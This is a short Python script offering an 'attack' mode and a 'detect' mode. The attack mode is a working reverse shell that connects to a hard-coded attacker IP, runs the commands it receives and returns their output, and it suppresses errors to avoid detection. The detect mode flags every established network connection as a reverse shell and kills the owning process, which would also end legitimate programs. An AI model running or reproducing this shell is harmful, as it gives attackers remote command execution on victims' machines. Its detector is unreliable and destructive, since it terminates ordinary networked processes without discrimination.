import socket
import subprocess
import psutil
import sys
import os
import signal

# Change these values for reverse shell connection
ATTACKER_IP = "192.168.1.100"  # Attacker's IP
ATTACKER_PORT = 4444  # Port to listen on

# ---- REVERSE SHELL FUNCTION ----
def reverse_shell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ATTACKER_IP, ATTACKER_PORT))
        
        while True:
            command = s.recv(1024).decode("utf-8")
            if command.lower() == "exit":
                break
            output = subprocess.getoutput(command)
            s.send(output.encode("utf-8"))
        
        s.close()
    except Exception as e:
        pass  # Ignore errors to avoid detection

# ---- BACKDOOR DETECTION & TERMINATION FUNCTION ----
def detect_and_kill_reverse_shell():
    suspicious_connections = []
    
    for proc in psutil.process_iter(attrs=['pid', 'name']):
        try:
            connections = proc.connections(kind="inet")
            for conn in connections:
                if conn.status == psutil.CONN_ESTABLISHED and conn.raddr:
                    suspicious_connections.append((proc, conn))

        except (psutil.AccessDenied, psutil.NoSuchProcess):
            continue

    if suspicious_connections:
        print("\n[!] Potential Reverse Shell Detected!\n")
        for proc, conn in suspicious_connections:
            print(f"Suspicious Process: {proc.info['name']} (PID: {proc.info['pid']}) -> {conn.raddr}")
            
            # Kill the process
            try:
                print(f"[*] Terminating process {proc.info['name']} (PID: {proc.info['pid']})")
                if os.name == "nt":  # Windows
                    subprocess.call(["taskkill", "/F", "/PID", str(proc.info['pid'])])
                else:  # Linux / Mac
                    os.kill(proc.info['pid'], signal.SIGTERM)
                print("[✓] Process Terminated Successfully!\n")
            except Exception as e:
                print(f"[X] Failed to terminate process: {e}\n")

    else:
        print("\n[✓] No Reverse Shells Detected.\n")

# ---- MAIN FUNCTION ----
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage:")
        print("  To start Reverse Shell (Attacker): python script.py attack")
        print("  To Detect & Kill Reverse Shell (Defender): python script.py detect")
        sys.exit(1)

    mode = sys.argv[1].lower()

    if mode == "attack":
        reverse_shell()
    elif mode == "detect":
        detect_and_kill_reverse_shell()
    else:
        print("Invalid mode! Use 'attack' or 'detect'")
